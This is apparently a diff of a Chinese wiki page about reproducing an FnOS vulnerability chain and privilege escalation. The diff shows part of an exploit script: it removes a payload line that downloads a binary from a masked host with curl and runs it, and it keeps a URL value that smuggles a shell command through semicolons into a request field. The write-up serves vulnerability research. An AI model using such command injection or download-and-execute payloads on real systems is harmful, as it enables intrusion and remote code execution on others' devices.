@@ -2,7 +2,7 @@
 title: FnOS漏洞链的复现以及提权
 description: FnOS漏洞链的复现以及提权
 published: true
-date: 2026-02-03T18:04:10.570Z
+date: 2026-02-03T18:05:26.827Z
 tags: 
 editor: markdown
 dateCreated: 2026-02-03T18:04:10.570Z
@@ -45,7 +45,7 @@ from Cryptodome.Random import get_random_bytes
 TARGET_URL = "ws://10.10.10.10:8000/websocket?type=main"
 
 # 攻击负载
-CMD_TO_EXECUTE = "cd /tmp && curl -L https://xxxxxxxxxxxxxx.xx/trim-sec -o trim-sec && chmod +x trim-sec && ./trim-sec "
+CMD_TO_EXECUTE = ""
 
 EXPLOIT_PAYLOAD_URL = f"http://10.10.10.10:8000 ; {CMD_TO_EXECUTE} ; /usr/bin/echo "
 
